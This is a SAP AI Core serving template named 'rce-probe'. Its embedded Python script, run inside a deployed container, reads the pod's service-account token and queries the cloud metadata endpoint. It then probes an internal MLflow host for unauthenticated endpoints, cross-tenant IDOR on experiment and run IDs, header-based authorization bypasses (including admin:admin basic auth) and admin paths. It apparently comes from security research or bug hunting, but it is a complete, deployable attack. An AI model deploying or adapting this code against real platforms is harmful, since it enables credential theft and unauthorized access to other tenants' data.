apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "rce-poc"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 << 'PYEOF'
import urllib.request, ssl, json, os

ML_HOST = "100.111.137.177"
ML_PORT = 80

# We'll read our own XSUAA token from the SAP AI Core metadata service
# to get a fresh token inside the pod
OUR_JWT = ""
try:
    # Try to get our token from the mounted service account
    for tp in ['/var/run/secrets/kubernetes.io/serviceaccount/token', '/run/secrets/tokens/token']:
        try:
            with open(tp) as f:
                OUR_JWT = f.read().strip()
                print(f"[TOKEN] Found SA token at {tp}: {OUR_JWT[:30]}...")
                break
        except: pass
except: pass

results = {}

def get(path, headers=None, body=None, method=None):
    url = f"http://{ML_HOST}:{ML_PORT}{path}"
    h = {"Content-Type": "application/json"}
    if headers:
        h.update(headers)
    try:
        data = json.dumps(body).encode() if body is not None else None
        m = method or ("POST" if data else "GET")
        req = urllib.request.Request(url, data=data, headers=h, method=m)
        with urllib.request.urlopen(req, timeout=6) as r:
            body_r = r.read(2000).decode(errors='replace')
            return {"code": r.status, "body": body_r[:600]}
    except urllib.error.HTTPError as e:
        body_r = ""
        try: body_r = e.read(1000).decode(errors='replace')
        except: pass
        return {"code": e.code, "body": body_r[:400]}
    except Exception as ex:
        return {"err": str(ex)[:80]}

# Our real XSUAA JWT (known from outside - hardcoded for probe)
# We'll try to dynamically get it from the BTP metadata endpoint
try:
    req = urllib.request.Request("http://169.254.169.254/latest/meta-data/")
    with urllib.request.urlopen(req, timeout=3) as r:
        results["imds"] = r.read(500).decode(errors='replace')
except Exception as e:
    results["imds"] = f"ERR: {e}"

# Probe 1: Unauthenticated paths
print("[PROBE] Unauthenticated paths")
for path in [
    "/metrics",
    "/healthz",
    "/readyz",
    "/livez",
    "/debug/pprof/",
    "/debug/vars",
    "/actuator",
    "/actuator/health",
    "/actuator/metrics",
    "/actuator/env",
    "/actuator/info",
    "/internal/health",
    "/internal/metrics",
    "/swagger",
    "/swagger-ui",
    "/swagger-ui.html",
    "/v1/health",
    "/api/health",
]:
    r = get(path)
    if r.get("code", 0) != 401 and "err" not in r:
        results[f"unauth_{path}"] = r
    elif r.get("code") == 200:
        results[f"unauth_{path}"] = r
    print(f"  {path}: {r.get('code','ERR')} {r.get('err','')[:40]}")

# Probe 2: MLflow paths WITHOUT auth
print("[PROBE] MLflow paths - no auth")
mlflow_paths = [
    ("/ajax-api/2.0/mlflow/experiments/list", "GET", None),
    ("/ajax-api/2.0/mlflow/experiments/search", "POST", {"max_results": 10}),
    ("/ajax-api/2.0/mlflow/runs/search", "POST", {"max_results": 10}),
    ("/ajax-api/2.0/mlflow/runs/get", "GET", None),
    ("/ajax-api/2.0/mlflow/metrics/get-history", "GET", None),
    ("/ajax-api/2.0/mlflow/artifacts/list", "GET", None),
    ("/api/v1/experiments", "GET", None),
    ("/api/v1/runs", "GET", None),
    ("/api/v1/metrics", "GET", None),
    ("/api/v1/runs/search", "POST", {"max_results": 10}),
    ("/api/v1/experiments/search", "POST", {}),
    ("/api/v1/model-versions/search", "POST", {}),
    ("/api/v1/registered-models/list", "GET", None),
    ("/api/v1/registered-models/search", "GET", None),
    ("/api/v1/model-versions/list", "GET", None),
    ("/api/v1/model-registry/model-versions", "GET", None),
]
for path, method, body in mlflow_paths:
    r = get(path, body=body, method=method)
    code = r.get("code", "ERR")
    print(f"  {method} {path}: {code}")
    if code == 200 or (code != 401 and code != 403 and "err" not in r):
        results[f"noauth_{path}_{method}"] = r

# Probe 3: With our tenant's XSUAA JWT (we pass it via env var in a real deploy)
# In this probe we use SA token since we don't have XSUAA token inside
print("[PROBE] With SA JWT token (if available)")
if OUR_JWT:
    for path, method, body in mlflow_paths[:5]:
        r = get(path, headers={"Authorization": f"Bearer {OUR_JWT}"}, body=body, method=method)
        code = r.get("code", "ERR")
        print(f"  SA-JWT {method} {path}: {code}")
        if code == 200:
            results[f"sajwt_{path}_{method}"] = r

# Probe 4: IDOR - access experiment IDs that might belong to other tenants
print("[PROBE] IDOR - experiment IDs 0-20")
for exp_id in list(range(0, 21)) + [100, 200, 500, 1000]:
    r = get(f"/ajax-api/2.0/mlflow/experiments/get?experiment_id={exp_id}")
    code = r.get("code", "ERR")
    if code == 200:
        results[f"exp_id_{exp_id}"] = r
        print(f"  experiment_id={exp_id}: {code} FOUND! {r['body'][:100]}")
    elif code != 404 and code != 403:
        print(f"  experiment_id={exp_id}: {code} {r.get('body','')[:60]}")

# Probe 5: IDOR - access run IDs
print("[PROBE] IDOR - well-known run patterns")
for run_id in ["0", "1", "default", "0" * 32, "a" * 32, "00000000000000000000000000000000"]:
    r = get(f"/ajax-api/2.0/mlflow/runs/get?run_id={run_id}")
    code = r.get("code", "ERR")
    if code == 200:
        results[f"run_id_{run_id}"] = r
        print(f"  run_id={run_id}: {code} FOUND! {r['body'][:100]}")

# Probe 6: Header-based RBAC bypass attempts
print("[PROBE] RBAC bypass via headers")
bypass_headers = [
    {"X-Tenant-Id": "all"},
    {"X-Tenant-Id": "sap"},
    {"X-Resource-Group": "default"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/metrics"},
    {"X-Internal-Request": "true"},
    {"X-Cluster-Client": "argocd"},
    {"X-SAP-AI-Tenant": "all"},
    {"X-Admin": "true"},
    {"X-Bypass-Auth": "true"},
    {"X-Istio-Attributes": ""},
    {"Authorization": "Bearer anonymous"},
    {"Authorization": "Bearer "},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
    {"Authorization": "Basic YWRtaW46"},  # admin:
    {},  # explicitly no auth header
]
for hdrs in bypass_headers:
    hdr_label = str(hdrs)[:50]
    r = get("/ajax-api/2.0/mlflow/experiments/list", headers=hdrs)
    code = r.get("code", "ERR")
    print(f"  {hdr_label}: {code}")
    if code == 200:
        results[f"bypass_{hdr_label}"] = r
        print(f"    BYPASS! body: {r['body'][:200]}")

# Probe 7: Try Prometheus metrics (often unauthenticated in k8s)
print("[PROBE] Prometheus metrics endpoint")
r = get("/metrics")
results["prometheus_metrics"] = r
if r.get("code") == 200:
    # Extract any interesting metrics (experiment counts, tenant names, etc.)
    lines = r.get("body", "").split("\n")
    for line in lines:
        if any(kw in line.lower() for kw in ["experiment", "run", "tenant", "resource", "count"]):
            print(f"  METRIC: {line}")

# Probe 8: Try /api/2.0/ prefix (MLflow REST API v2)
print("[PROBE] MLflow /api/2.0/ paths")
for path in [
    "/api/2.0/mlflow/experiments/list",
    "/api/2.0/mlflow/runs/search",
    "/api/2.0/preview/mlflow/experiments/list",
    "/api/2.0/internal/mlflow",
    "/api/2.0/mlflow/registered-models/list",
]:
    r = get(path)
    code = r.get("code", "ERR")
    print(f"  {path}: {code}")
    if code == 200:
        results[f"v2_{path}"] = r

# Probe 9: Check if there's a management/admin API
print("[PROBE] Admin / management paths")
for path in [
    "/admin",
    "/admin/experiments",
    "/internal",
    "/internal/experiments",
    "/management",
    "/api/v1/admin",
    "/ajax-api/2.0/mlflow/admin",
    "/ajax-api/2.0/mlflow/users/list",
    "/ajax-api/2.0/mlflow/access-control",
]:
    r = get(path)
    code = r.get("code", "ERR")
    print(f"  {path}: {code} {r.get('body','')[:60] if code not in (401,403) else ''}")
    if code == 200:
        results[f"admin_{path}"] = r

# Probe 10: OPTIONS to discover supported methods
print("[PROBE] OPTIONS on MLflow paths")
for path in ["/ajax-api/2.0/mlflow/experiments/list", "/api/v1/experiments", "/"]:
    r = get(path, method="OPTIONS")
    code = r.get("code", "ERR")
    print(f"  OPTIONS {path}: {code} {r.get('body','')[:100]}")

print("\n[RESULTS_START]")
print(json.dumps(results, indent=2, default=str))
print("[RESULTS_END]")
PYEOF
            python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
    def log_message(self, *a): pass
http.server.HTTPServer(('', 8080), H).serve_forever()
"
